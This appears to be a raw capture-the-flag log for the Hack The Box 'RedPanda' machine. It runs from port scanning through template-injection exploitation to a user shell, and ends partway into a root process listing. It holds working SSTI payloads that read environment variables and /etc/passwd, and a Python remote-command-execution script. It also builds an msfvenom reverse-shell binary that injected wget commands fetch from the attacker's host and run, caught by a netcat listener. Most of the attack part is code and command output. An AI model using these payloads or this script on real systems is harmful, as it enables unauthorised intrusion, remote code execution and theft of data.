```
┌──(kali㉿kali)-[~/hackthebox]
└─$ ping 10.10.11.170
PING 10.10.11.170 (10.10.11.170) 56(84) bytes of data.
64 bytes from 10.10.11.170: icmp_seq=1 ttl=63 time=185 ms
64 bytes from 10.10.11.170: icmp_seq=2 ttl=63 time=179 ms
^C
--- 10.10.11.170 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1000ms
rtt min/avg/max/mdev = 179.206/182.139/185.073/2.933 ms
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ rustscan -a 10.10.11.170 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.11.170:22
Open 10.10.11.170:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 15:30 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:30
Completed NSE at 15:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:30
Completed NSE at 15:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:30
Completed NSE at 15:30, 0.00s elapsed
Initiating Ping Scan at 15:30
Scanning 10.10.11.170 [2 ports]
Completed Ping Scan at 15:30, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:30
Completed Parallel DNS resolution of 1 host. at 15:30, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:30
Scanning 10.10.11.170 [2 ports]
Discovered open port 22/tcp on 10.10.11.170
Discovered open port 8080/tcp on 10.10.11.170
Completed Connect Scan at 15:30, 0.19s elapsed (2 total ports)
Initiating Service scan at 15:30
Scanning 2 services on 10.10.11.170
Completed Service scan at 15:31, 22.50s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.170.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 5.38s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.40s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Nmap scan report for 10.10.11.170
Host is up, received conn-refused (0.19s latency).
Scanned at 2022-11-08 15:30:42 EST for 29s

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
8080/tcp open  http-proxy syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Tue, 08 Nov 2022 20:30:49 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Tue, 08 Nov 2022 20:30:49 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Tue, 08 Nov 2022 20:30:49 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=11/8%Time=636ABC79%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Tue,\x2008\x20Nov\x20
SF:2022\x2020:30:49\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\
SF:x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"woode
SF:n_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codepe
SF:n\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/c
SF:ss\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20w
SF:ith\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20\
SF:x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20r
SF:ight'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x
SF:20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</
SF:div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x
SF:20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Tu
SF:e,\x2008\x20Nov\x202022\x2020:30:49\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/
SF:html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435
SF:\r\nDate:\x20Tue,\x2008\x20Nov\x202022\x2020:30:49\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x2
SF:0type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1
SF:,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x
SF:20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px
SF:;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heigh
SF:t:1px;background-color:#525D76;border:none;}</style></head><body><h1>HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html
SF:>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.26 seconds

http://10.10.11.170:8080/search

┌──(kali㉿kali)-[~/hackthebox]
└─$ whatweb http://10.10.11.170:8080
http://10.10.11.170:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot]

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

SSTI
Multiple variable expressions can be used, if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.

${7*7}
You searched for: Error occured: banned characters


*{7*7}
You searched for: 49

Java - Retrieve the system’s environment variables

*{T(java.lang.System).getenv()}

You searched for: {PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, SHELL=/bin/bash, JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64, TERM=unknown, USER=woodenk, LANG=en_US.UTF-8, SUDO_USER=root, SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, SUDO_GID=0, MAIL=/var/mail/woodenk, LOGNAME=woodenk, SUDO_UID=0, HOME=/home/woodenk}

Java - Retrieve /etc/passwd
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}

You searched for: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false


rev shell

┌──(kali㉿kali)-[~/hackthebox]
└─$ nano exploit_redpanda.py
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ cat exploit_redpanda.py 
#!/usr/bin/python3
import requests
from cmd import Cmd
from bs4 import BeautifulSoup

class RCE(Cmd):
    prompt = "\033[1;31m$\033[1;37m "
    def decimal(self, args):
        comando = args
        decimales = []

        for i in comando:
            decimales.append(str(ord(i)))
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % decimales[0]

        for i in decimales[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)

        payload += ").getInputStream())}"
        data = { "name": payload }
        requer = requests.post("http://10.10.11.170:8080/search", data=data)
        parser = BeautifulSoup(requer.content, 'html.parser')
        grepcm = parser.find_all("h2")[0].get_text()
        result = grepcm.replace('You searched for:','').strip()
        print(result)

    def default(self, args):
        try:
            self.decimal(args)
        except:
            print("%s: command not found" % (args))

RCE().cmdloop()



┌──(kali㉿kali)-[~/hackthebox]
└─$ python3 exploit_redpanda.py                                          
$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)                 
$ hostname -I                                                                    
10.10.11.170 dead:beef::250:56ff:feb9:1c59                                       
$ pwd                                                                            
/tmp/hsperfdata_woodenk                                                          
$ find / -type f -name user.txt 2>/dev/null                                      
                                                                                 
$ cd /home                                                                       
/usr/lib/python3/dist-packages/bs4/__init__.py:435: MarkupResemblesLocatorWarning: The input looks more like a filename than markup. You may want to open this file and pass the filehandle into Beautiful Soup.                                   
  warnings.warn(                                                                 
cd /home: command not found                                                      
$ ls                                                                             
877                                                                              
$ pwd                                                                            
/tmp/hsperfdata_woodenk                                                          
$ cat /home/woodenk/user.txt                                                     
a6a81a742e7e58f5b727a7f6029ba819 

or another way 

┌──(kali㉿kali)-[~/hackthebox]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.133 LPORT=443 -f elf > r.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

┌──(kali㉿kali)-[~/hackthebox]
└─$ python3 -m http.server     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.170 - - [08/Nov/2022 16:25:13] "GET /r.elf HTTP/1.1" 200 -

Start your HTTP server in the same location as r.elf if you haven’t using Python. Then send the following commands one by one over the website’s search bar to transfer r.elf, change the permission, and execute it.

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.10.14.133:8000/r.elf")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./r.elf")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./r.elf")}

┌──(kali㉿kali)-[~/hackthebox]
└─$ sudo nc -lvnp 443
[sudo] password for kali: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.170.
Ncat: Connection from 10.10.11.170:48408.
python3 -c 'import pty;pty.spawn("/bin/bash")'
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z
zsh: suspended  sudo nc -lvnp 443
                                                                              
┌──(kali㉿kali)-[~/hackthebox]
└─$ stty raw -echo   
                                                                              
┌──(kali㉿kali)-[~/hackthebox]
                              └─$ fg
[1]  + continued  sudo nc -lvnp 443
                                   export TERM=xterm
export TERM=xterm
woodenk@redpanda:/tmp/hsperfdata_woodenk$ 

woodenk@redpanda:/tmp/hsperfdata_woodenk$ whoami
whoami
woodenk
woodenk@redpanda:/tmp/hsperfdata_woodenk$ find / -type f -name user.txt 2>/dev/null
find / -type f -name user.txt 2>/dev/null
/home/woodenk/user.txt
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat /home/woodenk/user.txt
cat /home/woodenk/user.txt
a6a81a742e7e58f5b727a7f6029ba819

SSH

woodenk@redpanda:/tmp/hsperfdata_woodenk$ ps aux | grep root
ps aux | grep root
root           1  0.0  0.5 167788 10576 ?        Ss   16:04   0:02 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    16:04   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   16:04   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   16:04   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   16:04   0:00 [kworker/0:0H-kblockd]
root           9  0.0  0.0      0     0 ?        I<   16:04   0:00 [mm_percpu_wq]
root          10  0.0  0.0      0     0 ?        S    16:04   0:01 [ksoftirqd/0]
root          11  0.0  0.0      0     0 ?        I    16:04   0:08 [rcu_sched]
root          12  0.0  0.0      0     0 ?        S    16:04   0:00 [migration/0]
root          13  0.0  0.0      0     0 ?        S    16:04   0:00 [idle_inject/0]
root          14  0.0  0.0      0     0 ?        S    16:04   0:00 [cpuhp/0]
root          15  0.0  0.0      0     0 ?        S    16:04   0:00 [cpuhp/1]
root          16  0.0  0.0      0     0 ?        S    16:04   0:00 [idle_inject/1]
root          17  0.0  0.0      0     0 ?        S    16:04   0:00 [migration/1]
root          18  0.0  0.0      0     0 ?        S    16:04   0:01 [ksoftirqd/1]
root          20  0.0  0.0      0     0 ?        I<   16:04   0:00 [kworker/1:0H-kblockd]
root          21  0.0  0.0      0     0 ?        S    16:04   0:00 [kdevtmpfs]
root          22  0.0  0.0      0     0 ?        I<   16:04   0:00 [netns]
root          23  0.0  0.0      0     0 ?        S    16:04   0:00 [rcu_tasks_kthre]
root          24  0.0  0.0      0     0 ?        S    16:04   0:00 [kauditd]
root          25  0.0  0.0      0     0 ?        S    16:04   0:00 [khungtaskd]
root          26  0.0  0.0      0     0 ?        S    16:04   0:00 [oom_reaper]
root          27  0.0  0.0      0     0 ?        I<   16:04   0:00 [writeback]
root          28  0.0  0.0      0     0 ?        S    16:04   0:00 [kcompactd0]
root          29  0.0  0.0      0     0 ?        SN   16:04   0:00 [ksmd]
root          30  0.0  0.0      0     0 ?        SN   16:04   0:00 [khugepaged]
root          77  0.0  0.0      0     0 ?        I<   16:04   0:00 [kintegrityd]
root          78  0.0  0.0      0     0 ?        I<   16:04   0:00 [kblockd]
root          79  0.0  0.0      0     0 ?        I<   16:04   0:00 [blkcg_punt_bio]
root          80  0.0  0.0      0     0 ?        I<   16:04   0:00 [tpm_dev_wq]
root          81  0.0  0.0      0     0 ?        I<   16:04   0:00 [ata_sff]
root          82  0.0  0.0      0     0 ?        I<   16:04   0:00 [md]
root          83  0.0  0.0      0     0 ?        I<   16:04   0:00 [edac-poller]
root          84  0.0  0.0      0     0 ?        I<   16:04   0:00 [devfreq_wq]
root          85  0.0  0.0      0     0 ?        S    16:04   0:00 [watchdogd]
root          88  0.0  0.0      0     0 ?        S    16:04   0:01 [kswapd0]
root          89  0.0  0.0      0     0 ?        S    16:04   0:00 [ecryptfs-kthrea]
root          91  0.0  0.0      0     0 ?        I<   16:04   0:00 [kthrotld]
root          92  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/24-pciehp]
root          93  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/25-pciehp]
root          94  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/26-pciehp]
root          95  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/27-pciehp]
root          96  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/28-pciehp]
root          97  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/29-pciehp]
root          98  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/30-pciehp]
root          99  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/31-pciehp]
root         100  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/32-pciehp]
root         101  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/33-pciehp]
root         102  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/34-pciehp]
root         103  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/35-pciehp]
root         104  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/36-pciehp]
root         105  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/37-pciehp]
root         106  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/38-pciehp]
root         107  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/39-pciehp]
root         108  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/40-pciehp]
root         109  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/41-pciehp]
root         110  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/42-pciehp]
root         111  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/43-pciehp]
root         112  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/44-pciehp]
root         113  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/45-pciehp]
root         114  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/46-pciehp]
root         115  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/47-pciehp]
root         116  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/48-pciehp]
root         117  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/49-pciehp]
root         118  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/50-pciehp]
root         119  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/51-pciehp]
root         120  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/52-pciehp]
root         121  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/53-pciehp]
root         122  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/54-pciehp]
root         123  0.0  0.0      0     0 ?        S    16:04   0:00 [irq/55-pciehp]
root         124  0.0  0.0      0     0 ?        I<   16:04   0:00 [acpi_thermal_pm]
root         125  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_0]
root         126  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_0]
root         127  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_1]
root         128  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_1]
root         130  0.0  0.0      0     0 ?        I<   16:04   0:00 [vfio-irqfd-clea]
root         131  0.0  0.0      0     0 ?        I<   16:04   0:00 [ipv6_addrconf]
root         141  0.0  0.0      0     0 ?        I<   16:04   0:00 [kstrp]
root         144  0.0  0.0      0     0 ?        I<   16:04   0:00 [kworker/u5:0]
root         157  0.0  0.0      0     0 ?        I<   16:04   0:00 [charger_manager]
root         197  0.0  0.0      0     0 ?        I<   16:04   0:00 [cryptd]
root         207  0.0  0.0      0     0 ?        I<   16:04   0:00 [mpt_poll_0]
root         210  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_2]
root         215  0.0  0.0      0     0 ?        I<   16:04   0:00 [mpt/0]
root         223  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_2]
root         226  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_3]
root         229  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_3]
root         233  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_4]
root         237  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_4]
root         240  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_5]
root         241  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_5]
root         242  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_6]
root         243  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_6]
root         244  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_7]
root         245  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_7]
root         246  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_8]
root         247  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_8]
root         248  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_9]
root         249  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_9]
root         250  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_10]
root         251  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_10]
root         252  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_11]
root         253  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_11]
root         254  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_12]
root         255  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_12]
root         256  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_13]
root         257  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_13]
root         258  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_14]
root         259  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_14]
root         260  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_15]
root         261  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_15]
root         262  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_16]
root         263  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_16]
root         264  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_17]
root         265  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_17]
root         266  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_18]
root         267  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_18]
root         268  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_19]
root         269  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_19]
root         270  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_20]
root         271  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_20]
root         272  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_21]
root         273  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_21]
root         274  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_22]
root         275  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_22]
root         276  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_23]
root         277  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_23]
root         278  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_24]
root         279  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_24]
